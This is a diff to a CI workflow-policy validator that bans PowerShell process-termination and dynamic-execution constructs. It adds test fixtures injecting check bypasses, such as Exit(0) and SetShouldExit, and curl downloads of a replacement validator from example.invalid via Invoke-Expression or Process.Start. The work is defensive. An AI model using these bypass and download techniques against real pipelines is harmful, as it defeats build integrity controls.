@@ -152,7 +152,7 @@ const NETWORK_CLIENT = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|i
 // Enumerating the indirect writers (Set-Variable, New-Variable, the Variable:
 // provider, [ref] handles) is the same losing shape, so the whole reviewed
 // script is pinned instead: any edit at all changes this digest.
-const REVIEWED_VALIDATION_STEP_DIGEST = 'febb2a5e4656ade32ab2e5877aff5acc2c11434255195327e9f71ee57232c047';
+const REVIEWED_VALIDATION_STEP_DIGEST = '963e1f8ac82a925339dffc08b819ff3d0e429101961d5e9bec2f6b4f8ee49f8e';
 
 // The credential-cleanup step's assertions all test for the presence of a
 // sequence, and presence is not execution: an inserted early exit satisfies
@@ -428,9 +428,46 @@ function allRunSteps(workflow) {
 // Drops whole-line comments only. Trimming from the first # on every line
 // would truncate a code line containing one inside a string, which would hide
 // text these counts exist to see; a line that is entirely a comment cannot.
+// A deliberately conservative code view: whole comment lines are removed and
+// nothing else is. It does *not* truncate a line at a trailing #, because a #
+// inside a quoted span is string content, and truncating there would silently
+// delete real code -- turning "$null = '#'; Get-Command" into "$null = " and
+// hiding the very construct a caller is scanning for. Every rule built on this
+// helper is a ban, so a false negative is the dangerous direction and a line
+// filter cannot produce one from code: a line whose first non-whitespace
+// character is # is a comment to PowerShell too.
+//
+// Known and accepted imprecision: a here-string content line beginning with #
+// is removed as though it were a comment. That cannot hide an executed
+// construct, because such a line is a comment when the here-string is executed
+// as well.
 function powerShellCodeOnly(text) {
   return text.split('\n').filter((line) => !/^\s*#/u.test(line)).join('\n');
 }
+
+// For a governed step to report success while skipping a required phase, its
+// pwsh process must terminate with status 0 before that phase runs. Measured on
+// PowerShell 7.6.4 Core/Unix, the ways to do that are: `exit 0` and a top-level
+// `return` (both refused in statement position by the callers of this helper),
+// and [Environment]::Exit(0), which those statement-position rules cannot see
+// because the token follows `::`. .NET documents Exit as terminating the process
+// immediately with the given status -- and as skipping any finally block, which
+// would also defeat the $env:CI restore in the Markdown step.
+//
+// SetShouldExit is refused alongside it for a different reason: measured, it
+// does *not* skip the statements that follow -- it forces the process status --
+// so it turns a failed phase into a green step rather than skipping one. Both
+// belong to the same class of "the step reports success it did not earn".
+//
+// Deliberately not in this list: Stop-Process and Process.Kill. Neither can
+// produce a clean zero -- killing the shell surfaces as a signal status, and
+// [Environment]::FailFast was measured at 134 (SIGABRT) -- so neither buys a
+// green step. Banning them by pattern would also refuse
+// System.Diagnostics.Process outright, which is the mechanism build.verify uses
+// to launch its credentialed Git probes. A ban that refuses a step's own
+// required mechanism is a false positive, not a control; FailFast is kept only
+// because it costs nothing and collides with nothing.
+const PROCESS_TERMINATION = /\[\s*(?:System\.)?Environment\s*\]\s*::\s*(?:Exit|FailFast)|\bSetShouldExit\b/iu;
 
 function powerShellBraceDepthAt(text, offset) {
   let depth = 0;
@@ -799,6 +836,11 @@ export function validateBuildPolicy(workflow, source) {
   if (/^[ \t]*(?:exit|break|continue)\b|[;{][ \t]*(?:exit|break|continue)\b/imu.test(generateStep.run)) {
     reject('side-effect-policy', 'build.verify adds control flow that can bypass a required probe');
   }
+  // Statement position cannot see a termination that arrives through a static
+  // method. See PROCESS_TERMINATION for the enumeration and why it closes.
+  if (PROCESS_TERMINATION.test(generateStep.run)) {
+    reject('side-effect-policy', 'build.verify adds a process-termination path that can bypass a required probe');
+  }
   // return could not join that list: this script defines five functions and
   // every one of them ends in a return, so refusing the token outright would
   // refuse the script itself. Indentation cannot separate the two either --
@@ -928,19 +970,55 @@ function validateAcquireStep(step, label, expected) {
   if (classifiedStatuses !== expected.classifiedStatuses) {
     reject('acquire-policy', `${label} native-status classification count changed`);
   }
-  if (/\b(?:exit|return|break|continue|trap)\b/iu.test(step.run)) {
+  // Same reason as the credential step: the token ban catches
+  // [Environment]::Exit only by coincidence and misses SetShouldExit entirely.
+  if (/\b(?:exit|return|break|continue|trap)\b/iu.test(step.run) || PROCESS_TERMINATION.test(step.run)) {
     reject('acquire-policy', `${label} adds control flow that can bypass a required assertion`);
   }
-  // Every call operator in an acquire step names a literal command. Counting
-  // client names in the text cannot see $strClient = 'cu' + 'rl'; & $strClient,
-  // so the invocation target is constrained rather than the spelling of the
-  // name: an indirect call has no literal to match and is refused here
-  // however the name was assembled.
+  // The invocation surface of an acquire step, closed by argument rather than
+  // by enumerating spellings -- which is the control that has failed here
+  // repeatedly. Counting client names cannot see $strClient = 'cu' + 'rl',
+  // so what is constrained is the invocation itself:
+  //
+  //   1. PowerShell has exactly two operators that invoke a command whose name
+  //      is *computed*: & (call) and . (dot-source). Both are constrained below
+  //      to the three reviewed path Constants, so no assembled name can run.
+  //   2. Every other invocation must name its command with a literal, and a
+  //      literal is text this scan can see. The literals that execute a string
+  //      are refused by name below; the literals that perform network I/O are
+  //      refused by NETWORK_CLIENT.
+  //
+  // Together those close the surface: an acquire step can invoke exactly the
+  // three tools it was reviewed to invoke, and nothing can be reached by
+  // assembling a name at runtime.
+  //
+  // The two operators are scanned separately because they are not spelled
+  // alike. & is unambiguous wherever it appears. A dot is only the dot-source
+  // operator at statement position -- verified on 7.6.4, where `. $p`, `.$p`
+  // and a tab separator all dot-source, while `$PWD.Path`, `(...).Trim()` and
+  // a trailing `.` argument do not. So the dot branch is anchored the same way
+  // the control-flow bans are: line start, or directly after ; { or |, with
+  // the target on the same line.
   const stepCode = powerShellCodeOnly(step.run);
+  const arrReviewedTargets = ['$strGitPath', '$strCurlPath', '$strTarPath'];
   for (const call of stepCode.matchAll(/&\s*(\S+)/gu)) {
-    if (!['$strGitPath', '$strCurlPath', '$strTarPath'].includes(call[1])) {
+    if (!arrReviewedTargets.includes(call[1])) {
       reject('acquire-policy', `${label} invokes something other than a reviewed literal command`);
     }
+  }
+  for (const call of stepCode.matchAll(/(?:^[ \t]*|[;{|][ \t]*)\.[^\S\n]*([^\s]+)/gmu)) {
+    if (!arrReviewedTargets.includes(call[1])) {
+      reject('acquire-policy', `${label} dot-sources something other than a reviewed literal command`);
+    }
+  }
+  // Named literals that run a string as a command. Microsoft documents
+  // Invoke-Expression as evaluating "a specified string as a command" and notes
+  // the call operator is the safer form; the aliases are documented on all
+  // platforms, so they are refused alongside the full names. Spelling these
+  // indirectly is not a way around the list, because an assembled name has to
+  // be invoked through & or . to run at all, and both are constrained above.
+  if (/\b(?:Invoke-Expression|iex|Invoke-Command|icm|Start-Process|saps)\b|\[\s*(?:System\.)?Management\.Automation\.ScriptBlock\s*\]|\[\s*scriptblock\s*\]\s*::\s*Create|\$ExecutionContext\s*\.\s*InvokeCommand|(?:System\.)?Diagnostics\.Process/iu.test(stepCode)) {
+    reject('acquire-policy', `${label} adds a dynamic or indirect execution path`);
   }
   // Counted, not merely permitted. The Markdown acquire step is allowed one
   // download and the build one is allowed none, and a second request is how a
@@ -1025,7 +1103,11 @@ function validateCredentialCleanupStep(step, label) {
   // and a complete-script digest. It has both now, for the same reason the
   // generate-and-verify step does. This script defines no functions, so the
   // tokens are matched anywhere rather than in statement position only.
-  if (/\b(?:exit|break|continue)\b/iu.test(step.run)) {
+  // PROCESS_TERMINATION is applied here too. The token ban above happens to
+  // catch [Environment]::Exit through the word Exit, but it does not catch
+  // SetShouldExit, where the word boundary falls inside the name; relying on
+  // that coincidence would leave the class half-covered.
+  if (/\b(?:exit|break|continue)\b/iu.test(step.run) || PROCESS_TERMINATION.test(step.run)) {
     reject('credential-policy', `${label} adds control flow that can bypass a required assertion`);
   }
   if (createHash('sha256').update(step.run, 'utf8').digest('hex') !== REVIEWED_CREDENTIAL_STEP_DIGEST) {
@@ -1105,6 +1187,13 @@ export function validateMarkdownPolicy(workflow, source) {
   if (/^[ \t]*(?:exit|return|break|continue)\b|[;{][ \t]*(?:exit|return|break|continue)\b/imu.test(validation.run)) {
     reject('markdown-policy', 'validation script adds control flow that can bypass a required phase');
   }
+  // Statement position cannot see [Environment]::Exit(0), because the token
+  // follows :: rather than starting a statement. This step also restores
+  // $env:CI in a finally block, which that call would skip. See
+  // PROCESS_TERMINATION for the enumeration and why it closes.
+  if (PROCESS_TERMINATION.test(validation.run)) {
+    reject('markdown-policy', 'validation script adds a process-termination path that can bypass a required phase');
+  }
   // Presence is order-independent; the phases must also run in the reviewed
   // sequence, so a later phase cannot be hoisted above the gate that guards it.
   let cursor = -1;
@@ -1116,11 +1205,17 @@ export function validateMarkdownPolicy(workflow, source) {
     'supply: lint configuration or helper does not match the reviewed digest',
     'ci --ignore-scripts --no-audit --no-fund',
     'npm-ci: package metadata changed during frozen installation',
-    './Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
-    // Between the validator and the phases it could otherwise disarm.
+    // Between installation and the phases that read these two files. This
+    // ordering is load-bearing and the reason the validator moved below the
+    // linters: a hash taken before a repository-controlled program runs cannot
+    // describe what a later reader sees, because that program can leave a
+    // writer behind and choose when it writes (CWE-367). Nothing
+    // repository-controlled may sit between this check and the lint phases.
     'supply: lint configuration or helper changed after policy validation',
     'run lint:md\n',
     'run lint:md:nested',
+    // After both consumers, so it has no later reader left to poison.
+    './Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
     'validation: package metadata changed after installation or linting',
     'validation: one or more policy or lint phases failed',
   ]) {
@@ -1421,6 +1516,11 @@ const FIXTURE_INVENTORY = Object.freeze([
   }],
   ['T1-GENERATOR-001', 'generator body rewritten under an unchanged version marker', 'generator', (source) => `${source}\nfunction Invoke-Unreviewed { Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack' }\n`],
   ['T1-GENERATOR-002', 'generator truncated', 'generator', (source) => source.slice(0, Math.floor(source.length / 2))],
+  // Round 37, finding C. The qualified lookup is demoted into a comment, which
+  // satisfies a presence check run against raw source, while the code resolves
+  // git through a session-state API that is not spelled Get-Command. Both
+  // halves of the guard have to be read against code for this to be refused.
+  ['T1-GENERATOR-003', 'qualified lookup demoted to a comment', 'generator', (source) => replaceOnce(source, "$arrGitCommands = @(Microsoft.PowerShell.Core\\Get-Command -Name 'git'", "# Microsoft.PowerShell.Core\\Get-Command -Name 'git'\n    $arrGitCommands = @($ExecutionContext.InvokeCommand.GetCommand('git'")],
   ['T1-MARKDOWN-020', 'lint asset digest gate removed', 'markdown', (source) => replaceOnce(source, '          if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {\n              throw \'supply: lint configuration or helper does not match the reviewed digest\'\n          }\n', '')],
   // The generator's descendants outlive the step, so the separation between the
   // job that runs the generator and the job that publishes bytes is load-bearing
@@ -1474,6 +1574,14 @@ const FIXTURE_INVENTORY = Object.freeze([
   // --% makes the rest of the line a literal native-command argument, so the
   // braces after it are not syntax while the scanner still counts them.
   ['T1-BUILD-127', 'stop-parsing token used to hide a top-level return', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          /bin/echo --% {\n          return\n          /bin/echo --% }\n          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
+  // Round 37, finding D. Statement-position matching cannot see a termination
+  // that arrives as a static method call, because the token follows :: rather
+  // than beginning a statement.
+  ['T1-BUILD-130', 'generate step terminated successfully before the probes', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          [System.Environment]::Exit(0)\n          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
+  ['T1-BUILD-131', 'generate step status forced through the host', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          $host.SetShouldExit(0)\n          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
+  ['T1-BUILD-132', 'credential step status forced through the host', 'build', (source) => replaceOnce(source, '          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n', '          $host.SetShouldExit(0)\n          $arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n')],
+  // Round 37, finding B, on the build acquire step.
+  ['T1-BUILD-133', 'build acquire step gains a dynamic execution path', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', "          Invoke-Expression ('gi' + 't fetch https://example.invalid/x')\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
   // Inert text satisfies a substring match. This wraps the approved invocation
   // in a single-quoted here-string, so the command appears verbatim in the
   // script and never executes.
@@ -1569,10 +1677,28 @@ const FIXTURE_INVENTORY = Object.freeze([
   // PowerShell does not require whitespace after the call operator, and it
   // executes a command named by a parenthesised expression.
   ['T1-MARKDOWN-035', 'call operator applied to a parenthesised expression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          &('cu' + 'rl') --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
-  // The validator runs before both lint phases and is repository-controlled,
-  // so the asset digests taken before it no longer describe what the linters
-  // read.
+  // The lint assets must be re-verified after installation, immediately before
+  // the phases that read them.
   ['T1-MARKDOWN-036', 'lint assets no longer re-verified after policy validation', 'markdown', (source) => replaceOnce(source, "          $strLintConfigAfterPolicy = (Get-FileHash -LiteralPath .markdownlint.jsonc -Algorithm SHA256).Hash\n          $strLintHelperAfterPolicy = (Get-FileHash -LiteralPath lint-nested-markdown.js -Algorithm SHA256).Hash\n          if ($strLintConfigAfterPolicy -cne $strReviewedLintConfigHash -or $strLintHelperAfterPolicy -cne $strReviewedLintHelperHash) {\n              throw 'supply: lint configuration or helper changed after policy validation'\n          }\n", '')],
+  // Round 37, finding A. The validator is repository-controlled, so running it
+  // before the linters lets an edited copy leave a writer behind that rewrites
+  // the rule configuration after it was hashed and before a linter reads it --
+  // a check/use race no re-hash can close. It must run after both consumers.
+  ['T1-MARKDOWN-037', 'policy validator hoisted back above the lint phases', 'markdown', (source) => {
+    const strPolicy = '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n          $intPolicyExit = $LASTEXITCODE\n          Write-Host "workflow-policy native exit: $intPolicyExit"\n';
+    const strOuter = '          & $strNpmPath run lint:md\n';
+    return replaceOnce(replaceOnce(source, strPolicy, ''), strOuter, strPolicy + strOuter);
+  }],
+  // Round 37, finding B. Dynamic execution reaches a command without a call
+  // operator and without a contiguous client name, so neither the invocation
+  // allowlist nor the network-client scan sees it.
+  ['T1-MARKDOWN-038', 'network client reached through Invoke-Expression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Invoke-Expression ('cu' + 'rl --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v')\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-MARKDOWN-039', 'assembled command name dot-sourced instead of called', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strClient = 'cu' + 'rl'\n          . $strClient --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-MARKDOWN-040', 'command started through the process API', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $objRun = [System.Diagnostics.Process]::Start('/usr/bin/curl', '-o ./x https://example.invalid/v')\n          $strNodeUrl = 'https://nodejs.org")],
+  // Round 37, finding D. Terminating the process with status zero skips every
+  // phase below without matching a statement-position control-flow token.
+  ['T1-MARKDOWN-041', 'process terminated successfully before the lint phases', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          [System.Environment]::Exit(0)\n          & $strNpmPath run lint:md\n')],
+  ['T1-MARKDOWN-042', 'step status forced to success through the host', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $host.SetShouldExit(0)\n          & $strNpmPath run lint:md\n')],
   ['T1-MARKDOWN-022', 'lint job regains a token scope', 'markdown', (source) => replaceOnce(source, '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions: {}\n', '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n')],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -1696,7 +1822,18 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-013": "markdown-policy: required phase is missing: if ($strPackageBefore -cne $strReviewedPackageHash -or $strLockBefore -cne $strReviewedLockHash)",
   "T1-BUILD-042": "credential-policy: verify.generate-and-verify expands an unapproved credential",
   "T1-MARKDOWN-015": "markdown-policy: validation script adds control flow that can bypass a required phase",
-  "T1-MARKDOWN-016": "markdown-policy: required phases are out of order at: supply: lint configuration or helper changed after policy validation",
+  "T1-MARKDOWN-016": "markdown-policy: required phases are out of order at: ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml",
+  "T1-MARKDOWN-037": "markdown-policy: required phases are out of order at: ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml",
+  "T1-MARKDOWN-038": "acquire-policy: markdown.acquire adds a dynamic or indirect execution path",
+  "T1-MARKDOWN-039": "acquire-policy: markdown.acquire dot-sources something other than a reviewed literal command",
+  "T1-MARKDOWN-040": "acquire-policy: markdown.acquire adds a dynamic or indirect execution path",
+  "T1-MARKDOWN-041": "markdown-policy: validation script adds a process-termination path that can bypass a required phase",
+  "T1-MARKDOWN-042": "markdown-policy: validation script adds a process-termination path that can bypass a required phase",
+  "T1-BUILD-130": "side-effect-policy: build.verify adds a process-termination path that can bypass a required probe",
+  "T1-BUILD-131": "side-effect-policy: build.verify adds a process-termination path that can bypass a required probe",
+  "T1-BUILD-132": "credential-policy: build.verify.verify-checkout-credentials adds control flow that can bypass a required assertion",
+  "T1-BUILD-133": "acquire-policy: build.verify.acquire adds a dynamic or indirect execution path",
+  "T1-GENERATOR-003": "supply-policy: the generator does not resolve Git through a module-qualified lookup",
   "T1-MARKDOWN-014": "markdown-policy: required phase is missing: if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {",
   "T1-MARKDOWN-017": "markdown-policy: captured phase status intPolicyExit is not assigned exactly once",
   "T1-DEPENDABOT-001": "policy: Dependabot configuration differs from the locked policy",
@@ -1951,15 +2088,27 @@ export function validateGeneratorPolicy(source) {
   // workflow policy already refuses Get-Command in the step that invokes this
   // script; named here so a re-stamp of the digest below cannot quietly
   // reintroduce the unqualified form.
-  if (!source.includes('Microsoft.PowerShell.Core\\Get-Command -Name \'git\'')) {
+  // Comment lines are stripped first: the rationale above this check in the
+  // generator names the unqualified form in prose, and a rule that cannot tell
+  // prose from code would forbid explaining itself.
+  const generatorCode = powerShellCodeOnly(source);
+  // Checked against code, not raw source. Against raw source a comment
+  // containing this phrase satisfies the requirement, which would let the
+  // positive half of the guard be met by prose while the generator resolved
+  // git some other way entirely.
+  if (!generatorCode.includes('Microsoft.PowerShell.Core\\Get-Command -Name \'git\'')) {
     reject('supply-policy', 'the generator does not resolve Git through a module-qualified lookup');
   }
-  // Comment lines are stripped first: the rationale above this check in the
-  // generator names the unqualified form in prose, and a rule that cannot
-  // tell prose from code would forbid explaining itself.
-  const generatorCode = powerShellCodeOnly(source);
   if (/(?<!Microsoft\.PowerShell\.Core\\)Get-Command/u.test(generatorCode)) {
     reject('supply-policy', 'the generator resolves a command through a shadowable lookup');
+  }
+  // Get-Command is not the only shadowable lookup. $ExecutionContext.InvokeCommand
+  // resolves through the same session state -- including the function table that
+  // makes the unqualified cmdlet interceptable in the first place -- and is not
+  // spelled Get-Command, so the check above cannot see it. Banning only the one
+  // spelling would be fixing the instance rather than the class.
+  if (/\$ExecutionContext\s*\.\s*InvokeCommand|\.\s*InvokeCommand\s*\.\s*GetCommand|\[\s*(?:System\.)?Management\.Automation\.CommandTypes\s*\]/iu.test(generatorCode)) {
+    reject('supply-policy', 'the generator resolves a command through a session-state lookup API');
   }
   if (createHash('sha256').update(source, 'utf8').digest('hex') !== REVIEWED_GENERATOR_DIGEST) {
     reject('supply-policy', 'generator does not match its reviewed digest');
